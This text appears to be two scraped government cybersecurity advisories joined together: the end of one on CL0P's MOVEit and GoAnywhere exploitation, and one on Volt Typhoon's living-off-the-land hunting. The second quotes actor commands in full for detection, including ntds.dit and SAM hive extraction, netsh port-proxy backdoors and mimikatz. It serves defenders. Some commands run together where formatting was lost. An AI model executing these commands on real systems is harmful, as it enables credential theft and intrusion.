In late January 2023, the CL0P ransomware group launched a campaign using a zero-day vulnerability, now catalogued as CVE-2023-0669, to target the GoAnywhere MFT platform. The group claimed to have exfiltrated data from the GoAnywhere MFT platform that impacted approximately 130 victims over the course of 10 days. Lateral movement into the victim networks from the GoAnywhere MFT was not identified, suggesting the breach was limited to the GoAnywhere platform itself. Over the next several weeks, as the exfiltrated data was parsed by the group, ransom notes were sent to upper-level executives of the victim companies, likely identified through open source research. The ransom notes threatened to publish the stolen files on the CL0P data leak site if victims did not pay the ransom amount.

CL0P’s toolkit contains several malware types to collect information, including the following:

FlawedAmmyy/FlawedGrace remote access trojan (RAT) collects information and attempts to communicate with the Command and Control (C2) server to enable the download of additional malware components,.
SDBot RAT propagates the infection, exploiting vulnerabilities and dropping copies of itself in removable drives and network shares,. It is also capable of propagating when shared though peer-to-peer (P2P) networks. SDBot is used as a backdoor, to enable other commands and functions to be executed in the compromised computer. This malware uses application shimming for persistence and to avoid detection,.
Truebot is a first-stage downloader module that can collect system information and take screenshots, developed and attributed to the Silence hacking group. After connecting to the C2 infrastructure, Truebot can be instructed to load shell code, or DLLs, download additional modules, run them, or delete itself,. In the case of TA505, Truebot has been used to download FlawedGrace or Cobalt Strike beacons.
Cobalt Strike is used to expand network access after gaining access to the Active Directory (AD) server,.
DEWMODE is a web shell written in PHP designed to target Accellion FTA devices and interact with the underlying MySQL database and is used to steal data from the compromised device,1505.003,.
LEMURLOOT is a web shell written in C# designed to target the MOVEit Transfer platform. The web shell authenticates incoming http requests via a hard-coded password and can run commands that will download files from the MOVEit Transfer system, extract its Azure system settings, retrieve detailed record information, create, insert, or delete a particular user. When responding to the request, the web shell returns data in a gzip compressed format.

CVE-2023-34362 MOVEIT TRANSFER VULNERABILITY
MOVEit is typically used to manage an organization’s file transfer operations and has a web application that supports MySQL, Microsoft SQL Server, and Azure SQL database engines. In May 2023, the CL0P ransomware group exploited a SQL injection zero-day vulnerability CVE-2023-34362 to install a web shell named LEMURLOOT on MOVEit Transfer web applications,1,. Lemurloot was used as a method of persistence, information gathering and data stealing in CVE-2023-34362. The webshell imports multiple libraries including “MOVEit.DMZ.ClassLib,” “MOVEit.DMZ.Application.Files,” and “MOVEit.DMZ.Application.Users” to interact with MOVEit managed file transfer software. The web shell was initially observed with the name human2.aspx in an effort to masquerade as the legitimate human.aspx file present as part of MOVEit Transfer software. Upon installation, the web shell creates a random 36 character password to be used for authentication. The web shell interacts with its operators by awaiting HTTP requests containing a header field named X-siLock-Comment, which must have a value assigned equal to the password established upon the installation of the web shell. After authenticating with the web shell, operators pass commands to the web shell that can:

Retrieve Microsoft Azure system settings, Azure Blob Storage, Azure Blob Storage account, Azure Blob key, and Azure Blob Container using the following query:

“select f.id, f.instid, f.folderid, filesize, f.Name as Name, u.LoginName as uploader, fr.FolderPath, fr.name as fname from folders fr, files f left join users u on f.UploadUsername = u.Username where f.FolderID = fr.ID” (Figure 2).


Enumerate the underlying SQL database.
Store a string sent by the operator and then retrieve a file with a name matching the string from the MOVEit Transfer system.
Create a new administrator privileged account with a randomly generated username and LoginName and RealName values set to “Health Check Service.”
Delete an account with LoginName and RealName values set to ‘Health Check Service.’


 

Figure 2 – Lemurloot webshell code that interacts with Azure

Progress Software announced the discovery of CVE-2023-34362 MOVEit Transfer vulnerability and issued guidance on known affected versions, software upgrades, and patching. Based on evidence of active exploitation, CISA added this vulnerability to the Known Exploited Vulnerabilities (KEVs) Catalog on June 2, 2023. This MOVEit Transfer critical vulnerability exploit impacts the following versions of the software,2,:

MOVEit Transfer 2023.0.0
MOVEit Transfer 2022.1.x
MOVEit Transfer 2022.0.x
MOVEit Transfer 2021.1.x
MOVEit Transfer 2021.0.x
MOVEit Transfer 2020.1.x
MOVEit Transfer 2020.0.x

Due to the speed and ease TA505 has exploited this vulnerability, and based on their past campaigns, FBI and CISA expect to see widespread exploitation of unpatched software services in both private and public networks. For IOCs related to the MOVEit campaign, see table 2.
DETECTION METHODS
Below, are open source deployable YARA rules that may be used to detect malicious activity of the MOVEit Transfer Zero Day Vulnerability. For more information, visit GitHub or the resource section of this CSA.,1,3,:

 

 

 

If a victim rebuilds the web server but leaves the database intact, the CL0P user accounts will still exist and can be used for persistent access to the system.
Victims can use the following SQL query to audit for active administrative accounts, and should validate that only intended accounts are present.
SELECT * FROM,<database name>,.,dbo,.,users, WHERE Permission=30 AND Status='active' and Deleted='0'
MOVEit Campaign Indicators of Compromise

GoAnywhere Campaign Indicators of Compromise


 

 

 

 
Updated June 16, 2023

End of Update
MITRE ATT&CK TECHNIQUES
See tables below for referenced CL0P tactics and techniques used in this advisory.

 

 

 

 

 

 

 

 

 

 
MITIGATIONS
The authoring agencies recommend organizations implement the mitigations below to improve their organization’s security posture in response to  threat actors’ activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats and TTPs. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections to reduce the risk of compromise by CL0P ransomware.

Reduce threat of malicious actors using remote access tools by:

Auditing remote access tools on your network to identify currently used and/or authorized software.
Reviewing logs for execution of remote access software to detect abnormal use of programs running as a portable executable,CPG 2.T,.
Using security software to detect instances of remote access software only being loaded in memory.
Requiring authorized remote access solutions only be used from within your network over approved remote access solutions, such as virtual private networks (VPNs) or virtual desktop interfaces (VDIs).
Blocking both inbound and outbound connections on common remote access software ports and protocols at the network perimeter.


Implement application controls to manage and control execution of software, including allowlisting remote access programs.

Application controls should prevent installation and execution of portable versions of unauthorized remote access and other software. A properly configured application allowlisting solution will block any unlisted application execution. Allowlisting is important because antivirus solutions may fail to detect the execution of malicious portable executables when the files use any combination of compression, encryption, or obfuscation.


Strictly limit the use of RDP and other remote desktop services. If RDP is necessary, rigorously apply best practices, for example,CPG 2.W,:

Audit the network for systems using RDP.
Close unused RDP ports.
Enforce account lockouts after a specified number of attempts.
Apply phishing-resistant multifactor authentication (MFA).
Log RDP login attempts.


Disable command-line and scripting activities and permissions,CPG 2.N,.
Restrict the use of PowerShell, using Group Policy, and only grant to specific users on a case-by-case basis. Typically, only those users or administrators who manage the network or Windows operating systems (OSs) should be permitted to use PowerShell,CPG 2.E,.
Update Windows PowerShell or PowerShell Core to the latest version and uninstall all earlier PowerShell versions. Logs from Windows PowerShell prior to version 5.0 are either non-existent or do not record enough detail to aid in enterprise monitoring and incident response activities,CPG 1.E, 2.S, 2.T,.
Review domain controllers, servers, workstations, and active directories for new and/or unrecognized accounts,CPG 4.C,.
Audit user accounts with administrative privileges and configure access controls according to the principle of least privilege,CPG 2.E,.
Reduce the threat of credential compromise via the following:

Place domain admin accounts in the protected users’ group to prevent caching of password hashes locally.
Refrain from storing plaintext credentials in scripts.


Implement time-based access for accounts set at the admin level and higher,CPG 2.A, 2.E,.

In addition, the authoring authorities of this CSA recommend network defenders apply the following mitigations to limit potential adversarial use of common system and network discovery techniques and to reduce the impact and risk of compromise by ransomware or data extortion actors: 

Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (i.e., hard drive, storage device, the cloud).
Maintain offline backups of data and regularly maintain backup and restoration (daily or weekly at minimum). By instituting this practice, an organization limits the severity of disruption to its business practices,CPG 2.R,.
Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with National Institute for Standards and Technology (NIST) standards for developing and managing password policies.

Use longer passwords consisting of at least eight characters and no more than 64 characters in length,CPG 2.B,.
Store passwords in hashed format using industry-recognized password managers.
Add password user “salts” to shared login credentials.
Avoid reusing passwords,CPG 2.C,.
Implement multiple failed login attempt account lockouts,CPG 2.G,.
Disable password “hints.”
Refrain from requiring password changes more frequently than once per year.Note: NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.
Require administrator credentials to install software.


Require multifactor authentication for all services to the extent possible, particularly for webmail, virtual private networks, and accounts that access critical systems,CPG 2.H,.
Keep all operating systems, software, and firmware up to date. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Prioritize patching known exploited vulnerabilities in internet-facing systems,CPG 1.E,.
Segment networks to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement,CPG 2.F,.
Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool. To aid in detecting the ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host,CPG 3.A,.
Install, regularly update, and enable real time detection for antivirus software on all hosts.
Disable unused ports,CPG 2.V,.
Consider adding an email banner to emails received from outside your organization,CPG 2.M,.
Disable hyperlinks in received emails.
Ensure all backup data is encrypted, immutable (i.e., ensure backup data cannot be altered or deleted), and covers the entire organization’s data infrastructure,CPG 2.K, 2.L, 2.R,.

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, FBI and CISA recommend exercising, testing, and validating your organization’s security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. The authoring authorities of this CSA recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see table 2).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

RESOURCES

Stopransomware.gov is a whole-of-government approach that gives one central location for ransomware resources and alerts.
Resource to mitigate a ransomware attack: CISA-Multi-State Information Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide.
No-cost cyber hygiene services: Cyber Hygiene Services and Ransomware Readiness Assessment.

REFERENCE,1, Zero-Day Vulnerability in MOVEit Transfer Exploited for Data Theft | Mandiant,2, MOVEit Transfer Critical Vulnerability (May 2023) - Progress Community,3, MOVEit Transfer Critical Vulnerability CVE-2023-34362 Rapid Response (huntress.com)
REPORTING
The FBI is seeking any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with CL0P group actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file. The FBI and CISA do not encourage paying ransom as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to a local FBI Field Office, report the incident to the FBI Internet Crime Complaint Center (IC3) at ic3.gov, or CISA at cisa.gov/report.
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. CISA and the FBI do not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by CISA or the FBI.






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-158a
26,"



Summary
The United States and international cybersecurity authorities are issuing this joint Cybersecurity Advisory (CSA) to highlight a recently discovered cluster of activity of interest associated with a People’s Republic of China (PRC) state-sponsored cyber actor, also known as Volt Typhoon. Private sector partners have identified that this activity affects networks across U.S. critical infrastructure sectors, and the authoring agencies believe the actor could apply the same techniques against these and other sectors worldwide.
This advisory from the United States National Security Agency (NSA), the U.S. Cybersecurity and Infrastructure Security Agency (CISA), the U.S. Federal Bureau of Investigation (FBI), the Australian Signals Directorate’s Australian Cyber Security Centre (ACSC), the Communications Security Establishment’s Canadian Centre for Cyber Security (CCCS), the New Zealand National Cyber Security Centre (NCSC-NZ), and the United Kingdom National Cyber Security Centre (NCSC-UK) (hereafter referred to as the “authoring agencies”) provides an overview of hunting guidance and associated best practices to detect this activity.
One of the actor’s primary tactics, techniques, and procedures (TTPs) is living off the land, which uses built-in network administration tools to perform their objectives. This TTP allows the actor to evade detection by blending in with normal Windows system and network activities, avoid endpoint detection and response (EDR) products that would alert on the introduction of third-party applications to the host, and limit the amount of activity that is captured in default logging configurations. Some of the built-in tools this actor uses are: wmic, ntdsutil, netsh, and PowerShell. The advisory provides examples of the actor’s commands along with detection signatures to aid network defenders in hunting for this activity. Many of the behavioral indicators included can also be legitimate system administration commands that appear in benign activity. Care should be taken not to assume that findings are malicious without further investigation or other indications of compromise.
Download the PDF version of this report (723 KB).
Download the Spanish version of this report (479.18 KB).
For a downloadable copy of IOCs, see


People's Republic of China State-Sponsored Cyber Actor Living off the Land to Evade Detection
(XML,       34.57 KB
  )




People's Republic of China State-Sponsored Cyber Actor Living off the Land to Evade Detection - Spanish
(PDF,       479.18 KB
  )


For a downloadable copy of IOCs in JSON format, see AA23-144A.stix.json.
Technical Details
This advisory uses the MITRE ATT&CK for Enterprise framework, version 13. See the Appendix: MITRE ATT&CK Techniques for all referenced tactics and techniques.
Background
The authoring agencies are aware of recent People’s Republic of China (PRC) state-sponsored cyber activity and have identified potential indicators associated with these techniques. This advisory will help net defenders hunt for this activity on their systems. It provides many network and host artifacts associated with the activity occurring after the network has been initially compromised, with a focus on command lines used by the cyber actor. An Indicators of compromise (IOCs) summary is included at the end of this advisory.
Especially for living off the land techniques, it is possible that some command lines might appear on a system as the result of benign activity and would be false positive indicators of malicious activity. Defenders must evaluate matches to determine their significance, applying their knowledge of the system and baseline behavior. Additionally, if creating detection logic based on these commands, network defenders should account for variability in command string arguments, as items such as ports used may differ across environments.
Artifacts
Network Artifacts
The actor has leveraged compromised small office/home office (SOHO) network devices as intermediate infrastructure to obscure their activity by having much of the command and control (C2) traffic emanate from local ISPs in the geographic area of the victim. Owners of SOHO devices should ensure that network management interfaces are not exposed to the Internet to avoid them being re-purposed as redirectors by malicious actors. If they must be exposed to the Internet, device owners and operators should ensure they follow zero trust principles and maintain the highest level of authentication and access controls possible.
The actor has used Earthworm and a custom Fast Reverse Proxy (FRP) client with hardcoded C2 callbacks [T1090] to ports 8080, 8443, 8043, 8000, and 10443 with various filenames including, but not limited to: cisco_up.exe, cl64.exe, vm3dservice.exe, watchdogd.exe, Win.exe, WmiPreSV.exe, and WmiPrvSE.exe.
Host Artifacts
Windows Management Instrumentation (WMI/WMIC)
The actor has executed the following command to gather information about local drives [T1082]:
cmd.exe /C ""wmic path win32_logicaldisk get caption,filesystem,freespace,size,volumename""
This command does not require administrative credentials to return results. The command uses a command prompt [T1059.003] to execute a Windows Management Instrumentation Command Line (WMIC) query, collecting information about the storage devices on the local host, including drive letter, file system (e.g., new technology file system [NTFS]), free space and drive size in bytes, and an optional volume name. Windows Management Instrumentation (WMI) is a built-in Windows tool that allows a user to access management information from hosts in an enterprise environment. The command line version of WMI is called WMIC.
By default, WMI Tracing is not enabled, so the WMI commands being executed and the associated user might not be available. Additional information on WMI events and tracing can be found in the References section of the advisory.
Ntds.dit Active Directory Database
The actor may try to exfiltrate the ntds.dit file and the SYSTEM registry hive from Windows domain controllers (DCs) out of the network to perform password cracking [T1003.003]. (The ntds.dit file is the main Active Directory (AD) database file and, by default, is stored at %SystemRoot%\NTDS\ntds.dit. This file contains information about users, groups, group memberships, and password hashes for all users in the domain; the SYSTEM registry hive contains the boot key that is used to encrypt information in the ntds.dit file.) Although the ntds.dit file is locked while in use by AD, a copy can be made by creating a Volume Shadow Copy and extracting the ntds.dit file from the Shadow Copy. The SYSTEM registry hive may also be obtained from the Shadow Copy. The following example commands show the actor creating a Shadow Copy and then extracting a copy of the ntds.dit file from it.
cmd /c vssadmin create shadow /for=C: > C:\Windows\Temp\<filename>.tmp cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\NTDS\ntds.dit C:\Windows\Temp > C:\Windows\Temp\<filename>.tmp
The built-in Ntdsutil.exe tool performs all these actions using a single command. There are several ways to execute Ntdsutil.exe, including running from an elevated command prompt (cmd.exe), using WMI/WMIC, or PowerShell. Defenders should look for the execution of Ntdsutil.exe commands using long, short, or a combination of the notations. For example, the long notation command activate instance ntds ifm can also be executed using the short notation ac i ntds i. Table 1 provides the long and short forms of the arguments used in the sample Ntdsutil.exe command, along with a brief description of the arguments.

Table 1: Ntdsutil.exe command syntax


Long form
Short form
Description




activate instance %
ac i %
Sets variable % as the active instance for ntdsutil to use


ifm
i
Install from media (ifm). Creates installation media to be used with DCPromo so the server will not need to copy data from another Domain Controller on the network



The actor has executed WMIC commands [T1047] to create a copy of the ntds.dit file and SYSTEM registry hive using ntdsutil.exe. Each of the following actor commands is a standalone example; multiple examples are provided to show how syntax and file paths may differ per environment.
wmic process call create ""ntdsutil \""ac i ntds\"" ifm \""create full C:\Windows\Temp\pro
wmic process call create ""cmd.exe /c ntdsutil \""ac i ntds\"" ifm \""create full C:\Windows\Temp\Pro""
wmic process call create ""cmd.exe /c mkdir C:\Windows\Temp\tmp & ntdsutil \""ac i ntds\"" ifm \""create full C:\Windows\Temp\tmp\""
""cmd.exe"" /c wmic process call create ""cmd.exe /c mkdir C:\windows\Temp\McAfee_Logs & ntdsutil \""ac i ntds\"" ifm \""create full C:\Windows\Temp\McAfee_Logs\""
cmd.exe /Q /c wmic process call create ""cmd.exe /c mkdir C:\Windows\Temp\tmp & ntdsutil \""ac i ntds\"" ifm \""create full C:\Windows\Temp\tmp\"" 1> \\127.0.0.1\ADMIN$\ 2>&1
Note: The <timestamp value> would be an epoch timestamp following the format like “__1684956600.123456”.
Each actor command above creates a copy of the ntds.dit database and the SYSTEM and SECURITY registry hives in the C:\Windows\Temp\<folder> directory, where <folder> is replaced with the path specified in the command (e.g., pro, tmp, or McAfee_Logs). By default, the hidden ADMIN$ share is mapped to C:\Windows\, so the last command will direct standard output and error messages from the command to a file within the folder specified.
The actor has also saved the files directly to the C:\Windows\Temp and C:\Users\Public directories, so the entirety of those directory structures should be analyzed. Ntdsutil.exe creates two subfolders in the directory specified in the command: an Active Directory folder that contains the ntds.dit and ntds.jfm files, and a registry folder that contains the SYSTEM and SECURITY hives. Defenders should look for this folder structure across their network:
<path specified in command>\Active Directory\ntds.dit
<path specified in command>\Active Directory\ntds.jfm
<path specified in command>\registry\SECURITY
<path specified in command>\registry\SYSTEM
When one of the example commands is executed, several successive log entries are created in the Application log, under the ESENT Source. Associated events can be viewed in Windows Event Viewer by navigating to: Windows Logs | Application. To narrow results to relevant events, select Filter Current Log from the Actions menu on the right side of the screen. In the Event sources dropdown, check the box next to ESENT, then limit the logs to ID numbers 216, 325, 326, and 327. Clicking the OK box will apply the filters to the results.
Since ESENT logging is used extensively throughout Windows, defenders should focus on events that reference ntds.dit. If such events are present, the events’ details should contain the file path where the file copies were created. Since these files can be deleted, or enhanced logging may not be configured on hosts, the file path can greatly aid in a hunt operation. Identifying the user associated with this activity is also a critical step in a hunt operation as other actions by the compromised—or actor-created—user account can be helpful to understand additional actor TTPs, as well as the breadth of the actor's actions.
Note: If an actor can exfiltrate the ntds.dit and SYSTEM registry hive, the entire domain should be considered compromised, as the actor will generally be able to crack the password hashes for domain user accounts, create their own accounts, and/or join unauthorized systems to the domain. If this occurs, defenders should follow guidance for removing malicious actors from victim networks, such as CISA's Eviction Guidance for Network Affected by the SolarWinds and Active Directory/M365 Compromise.
In addition to the above TTPs used by the actor to copy the ntds.dit file, the following tools could be used by an actor to obtain the same information:

Secretsdump.py

Note: This script is a component of Impacket, which the actor has been known to use


Invoke-NinjaCopy (PowerShell)
DSInternals (PowerShell)
FgDump
Metasploit

Best practices for securing ntds.dit include hardening Domain Controllers and monitoring event logs for ntdsutil.exe and similar process creations. Additionally, any use of administrator privileges should be audited and validated to confirm the legitimacy of executed commands.
PortProxy
The actor has used the following commands to enable port forwarding [T1090] on the host:
""cmd.exe /c ""netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress= connectport=8443 protocol=tcp""""
""cmd.exe /c netsh interface portproxy add v4tov4 listenport=50100 listenaddress=0.0.0.0 connectport=1433 connectaddress=""
where <rfc1918 internal ip address> is replaced with an IPv4 address internal to the network, omitting the < >’s.
Netsh is a built-in Windows command line scripting utility that can display or modify the network settings of a host, including the Windows Firewall. The portproxy add command is used to create a host:port proxy that will forward incoming connections on the provided listenaddress and listenport to the connectaddress and connectport. Administrative privileges are required to execute the portproxy command. Each portproxy command above will create a registry key in the HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp\ path. Defenders should look for the presences of keys in this path and investigate any anomalous entries.
Note: Using port proxies is not common for legitimate system administration since they can constitute a backdoor into the network that bypasses firewall policies. Administrators should limit port proxy usage within environments and only enable them for the period of time in which they are required.
Defenders should also use unusual IP addresses and ports in the command lines or registry entries to identify other hosts that are potentially included in actor actions. All hosts on the network should be examined for new and unusual firewall and port forwarding rules, as well as IP addresses and ports specified by the actor. If network traffic or logging is available, defenders should attempt to identify what traffic was forwarded though the port proxies to aid in the hunt operation. As previously mentioned, identifying the associated user account that made the networking changes can also aid in the hunt operation.
Firewall rule additions and changes can be viewed in Windows Event Viewer by navigating to: Applications and Service Logs | Microsoft | Windows | Windows Firewall With Advanced Security | Firewall.
In addition to host-level changes, defenders should review perimeter firewall configurations for unauthorized changes and/or entries that may permit external connections to internal hosts. The actor is known to target perimeter devices in their operations. Firewall logs should be reviewed for any connections to systems on the ports listed in any portproxy commands discovered.
PowerShell
The actor has used the following PowerShell [T1059.001] command to identify successful logons to the host [T1033]:
Get-EventLog security -instanceid 4624
Note: Event ID 4624 is logged when a user successfully logs on to a host and contains useful information such as the logon type (e.g., interactive or networking), associated user and computer account names, and the logon time. Event ID 4624 entries can be viewed in Windows Event Viewer by navigating to: Windows Logs | Security. PowerShell logs can be viewed in Event Viewer: Applications and Service Logs | Windows PowerShell.
This command identifies what user account they are currently leveraging to access the network, identify other users logged on to the host, or identify how their actions are being logged. If the actor is using a password spray technique [T1110.003], there may be several failed logon (Event ID 4625) events for several different user accounts, followed by one or more successful logons (Event ID 4624) within a short period of time. This period may vary by actor but can range from a few seconds to a few minutes.
If the actor is using brute force password attempts [T1110] against a single user account, there may be several Event ID 4625 entries for that account, followed by a successful logon Event ID 4624. Defenders should also look for abnormal account activity, such as logons outside of normal working hours and impossible time-and-distance logons (e.g., a user logging on from two geographically separated locations at the same time).
Impacket
The actor regularly employs the use of Impacket’s wmiexec, which redirects output to a file within the victim host's ADMIN$ share (C:\Windows\) containing an epoch timestamp in its name. The following is an example of the ""dir"" command being executed by wmiexec.py:
cmd.exe /Q /c *dir 1> \\127.0.0.1\ADMIN$\__1684956600.123456 2>&1
Note: Discovery of an entry similar to the example above in the Windows Event Log and/or a file with a name in a similar format may be evidence of malicious activity and should be investigated further. In the event that only a filename is discovered, the epoch timestamp within the filename reflects the time of execution by default and can be used to help scope threat hunting activities.
Enumeration of the Environment
The following commands were used by the actor to enumerate the network topology [T1016], the active directory structure [T1069.002], and other information about the target environment [T1069.001], [T1082]:
arp -acurl www.ip-api[.]comdnscmd . /enumrecords /zone {REDACTED}dnscmd . /enumzonesdnscmd /enumrecords {REDACTED} . /additionalipconfig /allldifde.exe -f c:\windows\temp\<filename>.txt -p subtreenet localgroup administratorsnet group /dom net group ""Domain Admins"" /domnetsh interface firewall show allnetsh interface portproxy show allnetsh interface portproxy show v4tov4netsh firewall show allnetsh portproxy show v4tov4netstat -anoreg query hklm\software\systeminfotasklist /vwhoamiwmic volume list briefwmic service briefwmic product list briefwmic baseboard list fullwevtutil qe security /rd:true /f:text /q:*[System[(EventID=4624) and TimeCreated[@SystemTime>='{REDACTED}']] and EventData[Data='{REDACTED}']]
Additional Credential Theft
The actor also used the following commands to identify additional opportunities for obtaining credentials in the environment [T1555], [T1003]:
dir C:\Users\{REDACTED}\.ssh\known_hostsdir C:\users\{REDACTED}\appdata\roaming\Mozilla\firefox\profilesmimikatz.exereg query hklm\software\OpenSSHreg query hklm\software\OpenSSH\Agentreg query hklm\software\realvncreg query hklm\software\realvnc\vncserverreg query hklm\software\realvnc\Allusersreg query hklm\software\realvnc\Allusers\vncserverreg query hkcu\software\{REDACTED}\putty\sessionreg save hklm\sam ss.datreg save hklm\system sy.dat
Additional Commands
The actor executed the following additional commands:
7z.exe a -p {REDACTED} c:\windows\temp\{REDACTED}.7zC:\Windows\system32\pcwrun.exeC:\Users\Administrator\Desktop\Win.exeC:\Windows\System32\cmdbak.exe /c ping -n 1 127.0.0.1 > C:\Windows\temp\putty.log C:\Windows\Temp\tmp.log""cmd.exe"" /c dir \\127.0.0.1\C$ /od""cmd.exe"" /c ping –a –n 1 <IP address>""cmd.exe"" /c wmic /user:<username> /password:<password> process call create ""net stop \""<service name>\"" > C:\Windows\Temp\tmp.log""cmd.exe /Q /c cd 1> \\127.0.0.1\ADMIN$\__<timestamp value> 2>&1net use \\127.0.0.1\IPC$ /y /dpowershell start-process -filepath c:\windows\temp\<filename>.bat -windowstyle Hiddenrar.exe a –{REDACTED} c:\Windows\temp\{REDACTED} D:\{REDACTED}\wmic /node:{REDACTED} /user:{REDACTED} /password:{REDACTED} cmd /c whoamixcopy C:\windows\temp\hp d:\{REDACTED}
Mitigations
The authoring agencies recommend organizations implement the mitigations below to improve your organization’s cybersecurity posture on the basis of the threat actor’s activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity Frameworks and guidance to protect against the most common and impactful threats and TTPs. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.

Defenders should harden domain controllers and monitor event logs [2.T] for ntdsutil.exe and similar process creations. Additionally, any use of administrator privileges should be audited and validated to confirm the legitimacy of executed commands.
Administrators should limit port proxy usage within environments and only enable them for the period of time in which they are required [2.X].
Defenders should investigate unusual IP addresses and ports in command lines, registry entries, and firewall logs to identify other hosts that are potentially involved in actor actions.
In addition to host-level changes, defenders should review perimeter firewall configurations for unauthorized changes and/or entries that may permit external connections to internal hosts.
Defenders should also look for abnormal account activity, such as logons outside of normal working hours and impossible time-and-distance logons (e.g., a user logging on from two geographically separated locations at the same time).
Defenders should forward log files to a hardened centralized logging server, preferably on a segmented network [2.F].

Logging Recommendations
To be able to detect the activity described in this CSA, defenders should set the audit policy for Windows security logs to include “audit process creation” and “include command line in process creation events” in addition to accessing the logs. Otherwise, the default logging configurations may not contain the necessary information.
Enabling these options will create Event ID 4688 entries in the Windows Security log to view command line processes. Given the cost and difficulty of logging and analyzing this kind of activity, if an organization must limit the requirements, they should focus on enabling this kind of logging on systems that are externally facing or perform authentication or authorization, especially including domain controllers.
To hunt for the malicious WMI and PowerShell activity, defenders should also log WMI and PowerShell events. By default, WMI Tracing and deep PowerShell logging are not enabled, but they can be enabled by following the configuration instructions linked in the References section.
The actor takes measures to hide their tracks, such as clearing logs [T1070.001]. To ensure log integrity and availability, defenders should forward log files to a hardened centralized logging server, preferably on a segmented network. Such an architecture makes it harder for an actor to cover their tracks as evidence of their actions will be captured in multiple locations.
Defenders should also monitor logs for Event ID 1102, which is generated when the audit log is cleared. All Event ID 1102 entries should be investigated as logs are generally not cleared and this is a known actor tactic to cover their tracks. Even if an event log is cleared on a host, if the logs are also stored on a logging server, the copy of the log will be preserved.
This activity is often linked to malicious exploitation of edge devices and network management devices. Defenders should enable logging on their edge devices, to include system logs, to be able to identify potential exploitation and lateral movement. They should also enable network-level logging, such as sysmon, webserver, middleware, and network device logs.
Indicators of Compromise (IOCs) Summary
Indicators of Compromise (IOCs) Summary
TTPs

Exploiting vulnerabilities [T1190] in widely used software including, but not limited to:

CVE-2021-40539—ManageEngine ADSelfService Plus.

APT Actors Exploiting Newly Identified Vulnerability in ManageEngine ADSelfService Plus.


CVE-2021-27860—FatPipe WARP, IPVPN, MPVPN.

An APT Group Exploiting a 0-day in FatPipe WARP,MPVPN, and IPVPN Software.




Using webshells for persistence and exfiltration [T1505.003], with at least some of the webshells derived from the Awen webshell.
Using compromised Small-Office Home-Office (SOHO) devices (e.g. routers) to obfuscate the source of the activity [T1090.002].

Most common types include ASUS, Cisco RV, Draytek Vigor, FatPipe IPVPN/MPVPN/WARP, Fortinet Fortigate, Netgear Prosafe, and Zyxel USG devices.
Common CVEs for these devices and mitigation guidance can be found in the joint Cybersecurity Advisory, Top CVEs Actively Exploited by People’s Republic of China State-Sponsored Cyber Actors.


Using living off the land tools for discovery, lateral movement, and collection activities, to include:

certutil
dnscmd
ldifde
makecab
net user/group/use
netsh
nltest
ntdsutil
PowerShell
req query/save
systeminfo
tasklist
wevtutil
wmic
xcopy


Selective clearing of Windows Event Logs, system logs, and other technical artifacts to remove evidence of their intrusion activity [T1070].
Using open source “hacktools” tools, such as:

Fast Reverse Proxy (frp)

Probably derived from the publicly-available fatedier and EarthWorm variants.


Impacket

To detect Impacket usage, see the joint Cybersecurity Advisory: Impacket and Exfiltration Tool Used to Steal Sensitive Information from Defense Industrial Base Organization.


Mimikatz.exe
Remote administration tools

Defenders should consult the joint Cybersecurity Advisory: Protecting Against Malicious Use of Remote Monitoring and Management Software.





Command Execution
File names and directory paths used in these commands are only meant to serve as examples. Actual names and paths may differ depending on environment and activity, so defenders should account for variants when performing queries.
Note: Many of the commands are derivatives of common system administration commands that could generate false positives when used alone without additional indicators.
